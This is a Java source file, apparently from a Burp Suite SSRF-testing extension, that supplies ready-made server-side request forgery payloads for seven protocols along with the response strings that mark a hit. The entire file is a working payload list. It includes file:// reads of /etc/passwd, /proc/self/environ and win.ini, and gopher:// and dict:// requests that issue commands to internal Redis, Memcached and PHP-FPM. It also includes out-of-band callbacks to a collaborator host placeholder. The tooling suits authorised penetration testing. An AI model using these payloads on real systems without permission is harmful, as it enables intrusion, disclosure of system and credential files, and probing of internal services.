// Created with the help of an AI Agent and littlespidy.
package burp.ssrfmap.modules;

import burp.ssrfmap.model.SSRFModuleCategory_littlespidy;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

public class ProtocolModules_littlespidy {

    public static List<SSRFPayloadItem_littlespidy> getPayloads(String protocol) {
        List<SSRFPayloadItem_littlespidy> items = new ArrayList<>();
        String p = protocol.toLowerCase();

        switch (p) {
            case "file":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "file", "file://",
                        "Local /etc/passwd disclosure",
                        "file:///etc/passwd",
                        Arrays.asList("root:x:0:0:", "daemon:", "/bin/bash", "/bin/sh"),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "file", "file://",
                        "Local /etc/hosts disclosure",
                        "file:///etc/hosts",
                        Arrays.asList("127.0.0.1", "localhost"),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "file", "file://",
                        "Process environ inspection",
                        "file:///proc/self/environ",
                        Arrays.asList("PATH=", "PWD=", "USER=", "HOME="),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "file", "file://",
                        "Process cmdline inspection",
                        "file:///proc/self/cmdline",
                        Collections.singletonList(""),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "file", "file://",
                        "Windows win.ini extraction",
                        "file:///c:/windows/win.ini",
                        Arrays.asList("[fonts]", "[extensions]", "for 16-bit app support"),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "file", "file://",
                        "Localhost file scheme bypass",
                        "file://localhost/etc/passwd",
                        Collections.singletonList("root:x:0:0:"),
                        false));
                break;

            case "dict":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "dict", "dict://",
                        "Memcached STAT command query",
                        "dict://127.0.0.1:11211/stat",
                        Arrays.asList("STAT pid", "STAT version", "STAT uptime"),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "dict", "dict://",
                        "Redis INFO command probe",
                        "dict://127.0.0.1:6379/info",
                        Arrays.asList("redis_version", "tcp_port", "uptime_in_seconds"),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "dict", "dict://",
                        "Local port service banner probe",
                        "dict://127.0.0.1:21/quit",
                        Collections.singletonList("220"),
                        false));
                break;

            case "sftp":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "sftp", "sftp://",
                        "SFTP out-of-band callback connection",
                        "sftp://{COLLABORATOR_HOST}:22/probe",
                        Collections.emptyList(),
                        true));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "sftp", "sftp://",
                        "SFTP internal SSH port probe",
                        "sftp://127.0.0.1:22/ssh_test",
                        Collections.singletonList("SSH-2.0"),
                        false));
                break;

            case "tftp":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "tftp", "tftp://",
                        "TFTP UDP out-of-band probe",
                        "tftp://{COLLABORATOR_HOST}:69/probe",
                        Collections.emptyList(),
                        true));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "tftp", "tftp://",
                        "TFTP internal service request",
                        "tftp://127.0.0.1:69/pxelinux.0",
                        Collections.emptyList(),
                        false));
                break;

            case "ldap":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "ldap", "ldap://",
                        "LDAP out-of-band callback directory query",
                        "ldap://{COLLABORATOR_HOST}:389/dc=ssrf,dc=probe",
                        Collections.emptyList(),
                        true));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "ldap", "ldap://",
                        "LDAP internal root DSE query",
                        "ldap://127.0.0.1:389/o=ssrf",
                        Collections.emptyList(),
                        false));
                break;

            case "smtp":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "smtp", "smtp://",
                        "SMTP out-of-band interaction probe",
                        "smtp://{COLLABORATOR_HOST}:25/",
                        Collections.emptyList(),
                        true));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "smtp", "smtp://",
                        "SMTP internal mailer probe",
                        "smtp://127.0.0.1:25/helo%20localhost",
                        Collections.singletonList("250"),
                        false));
                break;

            case "gopher":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "gopher", "gopher://",
                        "Gopher Redis INFO command execution",
                        "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
                        Arrays.asList("redis_version:", "tcp_port:6379"),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "gopher", "gopher://",
                        "Gopher Memcached stats command",
                        "gopher://127.0.0.1:11211/_stats%0d%0a",
                        Arrays.asList("STAT pid", "STAT version"),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "gopher", "gopher://",
                        "Gopher HTTP GET out-of-band probe",
                        "gopher://{COLLABORATOR_HOST}:80/_GET%20/gopher_ssrf%20HTTP/1.0%0d%0aHost:%20{COLLABORATOR_HOST}%0d%0a%0d%0a",
                        Collections.emptyList(),
                        true));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.PROTOCOL, "gopher", "gopher://",
                        "Gopher FastCGI PHP-FPM handshake probe",
                        "gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00",
                        Collections.emptyList(),
                        false));
                break;
        }

        return items;
    }

    public static List<SSRFPayloadItem_littlespidy> getAllProtocolPayloads() {
        List<SSRFPayloadItem_littlespidy> all = new ArrayList<>();
        all.addAll(getPayloads("file"));
        all.addAll(getPayloads("dict"));
        all.addAll(getPayloads("sftp"));
        all.addAll(getPayloads("tftp"));
        all.addAll(getPayloads("ldap"));
        all.addAll(getPayloads("smtp"));
        all.addAll(getPayloads("gopher"));
        return all;
    }
}
